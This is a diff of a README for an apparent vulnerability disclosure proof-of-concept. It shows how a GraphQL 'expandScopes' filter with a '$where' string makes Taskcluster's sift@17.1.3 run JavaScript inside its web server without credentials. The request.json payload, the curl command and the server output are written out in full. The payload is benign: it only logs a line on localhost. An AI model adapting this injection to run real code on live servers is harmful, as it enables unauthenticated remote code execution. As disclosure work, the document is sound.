@@ -1,34 +1,29 @@
-# An HTTP request makes Taskcluster run a `$where` string through `sift@17.1.3`
+# A GraphQL filter makes Taskcluster run JavaScript on the server
 
-![alt text](image-1.png)
+This PoC reproduces the problem locally with Taskcluster commit [`f48168b7c3a8a8f78c4463cde98c1218a9edc6c6`](https://github.com/taskcluster/taskcluster/tree/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6). It sends a `POST` request to `/graphql` without an `Authorization` header and asks Taskcluster to run `expandScopes`. The request includes a filter whose `$where` value is a JavaScript string. Taskcluster passes that filter to `sift@17.1.3`, and this version of `sift` runs the string as JavaScript inside the web server.
 
-## What this test proves
+The JavaScript in this PoC only prints one line in the local server terminal and returns `true`. It does not start another program, read a file, look for passwords or tokens, change saved data, or connect to another computer.
 
-An [HTTP POST](https://www.apollographql.com/docs/apollo-server/workflow/requests#post-requests) is a web request that carries data in its body. This request did not include an [`Authorization` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Authorization), the part of a web request that normally carries login credentials.
+There is one important limit to keep in mind before running the test. Taskcluster normally asks its separate Auth service which scopes it should return. Starting the complete Auth service would require its database and settings, so the supplied start script replaces that one request with a local function that returns the scope from the PoC. Everything after that reply is Taskcluster's own code: the web server reads the HTTP request, GraphQL calls `expandScopes`, the scope loader passes the filter to `sift`, and `sift` runs the string inside `$where`. For that reason, this PoC proves that the supplied filter can run JavaScript after Auth returns the scopes, but it does not prove which scopes a complete Taskcluster installation would return to an anonymous caller.
 
-The body asked the old Taskcluster `/graphql` address to run `expandScopes`. [GraphQL](https://graphql.org/learn/) is a language that lets one program name the data or action it wants from another program. Taskcluster's [GraphQL schema](https://graphql.org/learn/schema/) listed `expandScopes` as an allowed query, and its [`Scopes` resolver](https://www.graphql-js.org/docs/resolver-anatomy/) was the function that received the query's `scopes` and `filter` values. Here, `filter` contains the rules for deciding which returned permissions to keep. The resolver handed both values to Taskcluster's [scope loader](https://github.com/taskcluster/taskcluster/blob/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6/services/web-server/src/loaders/scopes.js#L18-L30), which asks Auth for the permissions and then gives the permissions and filter to [`sift`](https://github.com/crcn/sift.js/tree/v17.1.3), a package that checks JavaScript values against those rules.
+![The GraphQL request and the line printed in the Taskcluster server terminal](image-1.png)
 
-The filter contained [`$where`](https://github.com/crcn/sift.js/blob/v17.1.3/src/operations.ts#L385-L402), a `sift` option that tests each value with a supplied condition. In `sift@17.1.3`, `$where` could receive text and read that text as JavaScript code. The code used here only printed one line in the local server terminal and returned `true`. It did not start another program, read a file, inspect a saved password or token, or connect to another computer.
+## What you need before you start
 
-Taskcluster's [Auth service](https://github.com/taskcluster/taskcluster/blob/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6/services/auth/README.md#L1-L3) is the separate program that manages Taskcluster permissions and credentials. This test replaces the outgoing Auth request with a local function that returns the same permission list. Taskcluster still reads the HTTP body, finds `expandScopes`, calls `Scopes.js` and `loaders/scopes.js`, and reaches `sift` after that local function returns. The test does not independently check which permissions a real running Auth service gives an anonymous caller.
+You need this PoC folder, a local copy of the `taskcluster/taskcluster` repository, and Node.js 24. Taskcluster asks for Node.js `24.15.0`; the test recorded below used `24.19.0`. No Taskcluster account, login cookie, API key, or other credential is needed because the HTTP request deliberately leaves out the `Authorization` header.
 
-## Target and test details
+The recorded test used these values:
 
-- Source code: `taskcluster/taskcluster`
-- [Commit](https://git-scm.com/docs/gitglossary#Documentation/gitglossary.txt-aiddefcommitacommit), Git's name for a saved version of the files: `f48168b7c3a8a8f78c4463cde98c1218a9edc6c6`
-- Local address: `http://127.0.0.1:3211/graphql`
+- Taskcluster commit: `f48168b7c3a8a8f78c4463cde98c1218a9edc6c6`
+- Local URL: `http://127.0.0.1:3211/graphql`
 - GraphQL query: `expandScopes`
 - Installed `sift` version: `17.1.3`
-- [Node.js](https://nodejs.org/en/learn/getting-started/introduction-to-nodejs), the program that runs Taskcluster's JavaScript on the server, requested version: `24.15.0`
-- Node.js version used for this local run: `24.19.0`
+- Node.js version used: `24.19.0`
 - Test time: `2026-09-25 11:19:41 UTC`
-- Credentials: none; the request contained no `Authorization` header
 
-The local start script asks Taskcluster's [`main.js` to create its web server](https://github.com/taskcluster/taskcluster/blob/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6/services/web-server/src/main.js#L166-L195). The request then passes through the real [`/graphql` POST route and the code that reads its credentials](https://github.com/taskcluster/taskcluster/blob/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6/services/web-server/src/servers/createApp.js#L82-L91). This query never reads Taskcluster's database or message service, and the start script gives the server empty JavaScript objects for them instead of connecting to other programs.
+## 1. Check out the affected Taskcluster version
 
-## Check the affected version
-
-Open the affected commit and install the exact package versions recorded by Taskcluster:
+Open a terminal in your Taskcluster repository, switch to the affected commit, and install the exact package versions saved in the repository:
 
 ```bash
 cd /path/to/taskcluster
@@ -36,23 +31,21 @@ git switch --detach f48168b7c3a8a8f78c4463cde98c1218a9edc6c6
 corepack yarn install --immutable
 ```
 
-The following commands confirmed the commit, Node.js version, installed `sift` version, and the value of `CSP_ENABLED` in the local checkout:
+Once the install finishes, run the following commands from the same directory. They show the commit, the Node.js version, the installed `sift` version, and whether `CSP_ENABLED` is set:
 
 ```bash
 git rev-parse HEAD
 node -p '[process.version, require("./node_modules/sift/package.json").version, String(process.env.CSP_ENABLED)].join("\n")'
-```
 
-```text
 f48168b7c3a8a8f78c4463cde98c1218a9edc6c6
 v24.19.0
 17.1.3
 undefined
 ```
 
-`undefined` means `CSP_ENABLED` was not set.
+The last line says `undefined` because `CSP_ENABLED` was not set. This matters because [`sift@17.1.3` checks that setting before handling `$where`](https://github.com/crcn/sift.js/blob/v17.1.3/src/operations.ts#L385-L402). When the setting is missing or empty and `$where` contains a string, `sift` gives the string to `new Function()` and Node.js reads it as JavaScript. When `CSP_ENABLED` contains any non-empty value, `sift` stops with an error before it reaches `new Function()`.
 
-[Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP#eval_and_similar_apis) is a set of restrictions that can stop JavaScript from creating code from a string. The [`$where` code in `sift@17.1.3`](https://github.com/crcn/sift.js/blob/v17.1.3/src/operations.ts#L385-L402) reads the `CSP_ENABLED` setting before it handles the supplied value:
+The relevant `sift` code is shown below:
 
 ```javascript
 export const $where = (
@@ -75,29 +68,45 @@ export const $where = (
 };
 ```
 
-When `CSP_ENABLED` is missing or empty and `$where` contains a string, line 394 passes that string to `new Function()`, which makes Node.js read it as JavaScript code. Line 401 runs that code against each value that `sift` checks. When `CSP_ENABLED` contains any non-empty value, `sift` throws an error before calling `new Function()`.
+## 2. Start the local Taskcluster web server
 
-## Start the local web-server
-
-From this PoC folder, start the server in the first terminal:
+Open a second terminal in this PoC folder and pass the path of the Taskcluster repository to the start script:
 
 ```bash
-node start-local-server.mjs
+cd /path/to/taskcluster-sift-rce-reproduction
+node start-local-server.mjs /path/to/taskcluster
 ```
 
-The script checks that the Taskcluster checkout has `sift@17.1.3`, loads the old `services/web-server/src/main.js`, and listens only on `127.0.0.1`, an address that accepts connections from the same computer:
+The script first checks that the selected Taskcluster repository has `sift@17.1.3`. It then asks Taskcluster's own [`main.js`](https://github.com/taskcluster/taskcluster/blob/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6/services/web-server/src/main.js#L166-L195) to create the web server and binds it to `127.0.0.1`, so only programs on the same computer can reach it. When the server is ready, the terminal shows:
 
 ```text
 Taskcluster web-server: http://127.0.0.1:3211/graphql
 ```
 
-![alt text](image.png)
+![The local Taskcluster web server waiting for the request](image.png)
 
-## Send the HTTP request
+The script does not connect to Taskcluster's database, message service, or the other Taskcluster services because this query does not use them. It gives the web server empty local objects in their place. As explained above, it also replaces the outgoing Auth request with a small local function that returns `assume:anonymous`, which is the scope supplied in the request. The incoming request still goes through Taskcluster's real [`/graphql` route and credential-reading code](https://github.com/taskcluster/taskcluster/blob/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6/services/web-server/src/servers/createApp.js#L82-L91), then through its [`Scopes` resolver and scope loader](https://github.com/taskcluster/taskcluster/blob/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6/services/web-server/src/loaders/scopes.js#L18-L30).
 
-Taskcluster calls each permission name a [`scope`](https://github.com/taskcluster/taskcluster/blob/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6/dev-docs/best-practices/scopes.md), and the request uses one permission named `assume:anonymous`. Its `$where` string asks the server to print that permission and then returns `true`, which tells `sift` to keep it in the GraphQL result.
+## 3. Send the GraphQL request
 
-The request is stored in [`request.json`](./request.json). Send it from a second terminal with [`curl`](https://curl.se/docs/manpage.html), a command that sends web requests, and leave out the `Authorization` header:
+Leave the server running and open a third terminal in this PoC folder. The request body is already saved in [`request.json`](./request.json), and its full contents are included here so there is no hidden input:
+
+```json
+{
+  "operationName": "Verify",
+  "query": "query Verify($scopes: [String]!, $filter: JSON) { expandScopes(scopes: $scopes, filter: $filter) }",
+  "variables": {
+    "scopes": ["assume:anonymous"],
+    "filter": {
+      "$where": "(console.log(\"POC: $where ran inside the server for \" + String(this)), true)"
+    }
+  }
+}
+```
+
+Taskcluster calls each permission a [`scope`](https://github.com/taskcluster/taskcluster/blob/f48168b7c3a8a8f78c4463cde98c1218a9edc6c6/dev-docs/best-practices/scopes.md), so this request uses one permission named `assume:anonymous`. The text inside `$where` prints that name in the server terminal and then returns `true`, which tells `sift` to keep the value in the GraphQL response.
+
+Send the request with the following command. Do not add an `Authorization` header:
 
 ```bash
 curl -sS -w '\nHTTP %{http_code}\n' \
@@ -106,7 +115,7 @@ curl -sS -w '\nHTTP %{http_code}\n' \
   --data-binary @request.json
 ```
 
-The second terminal received this response:
+The terminal that sent the request received:
 
 ```text
 {"data":{"expandScopes":["assume:anonymous"]}}
@@ -114,11 +123,11 @@ The second terminal received this response:
 HTTP 200
 ```
 
-The GraphQL response contains `assume:anonymous` because the code inside `$where` returned `true`. [`HTTP 200`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/200) means the server accepted and handled the request, but that response alone does not show that the JavaScript ran, which is why the server terminal is the important part of this test.
+This response shows that GraphQL handled the request and kept `assume:anonymous`, but the response by itself does not prove that the JavaScript string ran. To confirm that part, return to the terminal where the server is running.
 
-## What the server printed
+## 4. Confirm that the JavaScript ran in the server
 
-The first terminal printed these three lines after the HTTP request arrived:
+After the request arrived, the server terminal printed:
 
 ```text
 HTTP credentials: none
@@ -126,24 +135,18 @@ Auth returned scopes: ["assume:anonymous"]
 POC: $where ran inside the server for assume:anonymous
 ```
 
-`HTTP credentials: none` confirms that the Taskcluster code reading the request did not find an `Authorization` header. `Auth returned scopes` records the local Auth replacement returning the one permission supplied by the request. The final line comes from the JavaScript string inside `$where`. That line appeared in the server terminal because `sift` passed the string to `new Function()` and ran it for `assume:anonymous`.
+The first line confirms that Taskcluster did not find credentials in the incoming HTTP request. The second line comes from the local Auth replacement and shows the scope it returned. The final line comes from the JavaScript string inside `$where`. It appears in the server terminal because `sift@17.1.3` gave that string to `new Function()` and ran it while checking `assume:anonymous`.
 
-The observed sequence was:
+In other words, the same request moved through the code in this order: Taskcluster accepted the `POST /graphql` request, found no `Authorization` header, called `expandScopes`, received `assume:anonymous` from the local Auth replacement, and passed that scope together with the supplied filter to `sift@17.1.3`. At that point, `sift` ran the `console.log` statement from `$where`, which produced the final line above.
 
-```text
-HTTP POST /graphql
-→ Taskcluster read the Authorization header and found no credentials
-→ GraphQL called expandScopes
-→ the local Auth replacement returned assume:anonymous
-→ Taskcluster passed the filter and permission to sift@17.1.3
-→ sift ran the console.log statement inside $where
-```
+## Expected and actual result
 
-## Expected and actual behavior
+**Expected:** Taskcluster should treat the text inside the GraphQL filter as data. Text sent by the client should not become JavaScript and run inside the web server.
 
-- Expected: Text received inside a GraphQL filter should stay as data and should never run as JavaScript inside the web-server program.
-- Actual: The HTTP request without an `Authorization` header reached `sift@17.1.3`, and the JavaScript inside `$where` printed a line in the web-server terminal.
+**Actual:** After the local Auth replacement returned the scope, Taskcluster passed the request's filter to `sift@17.1.3`. `sift` read the `$where` string as JavaScript and printed `POC: $where ran inside the server for assume:anonymous` in the web-server terminal.
 
 ## Safety and cleanup
 
-The server listens on `127.0.0.1`, which keeps it on the local computer. Press `Ctrl+C` in the first terminal after the test. The request creates no file or stored data, and no further cleanup is required.
+This test stays on the local computer because the server listens on `127.0.0.1`. The supplied JavaScript only calls `console.log` and returns `true`, so it does not create a file, change stored data, read sensitive information, or open a network connection.
+
+When the test is finished, return to the server terminal and press `Ctrl+C`. The request leaves no data or file behind, so no other cleanup is needed.
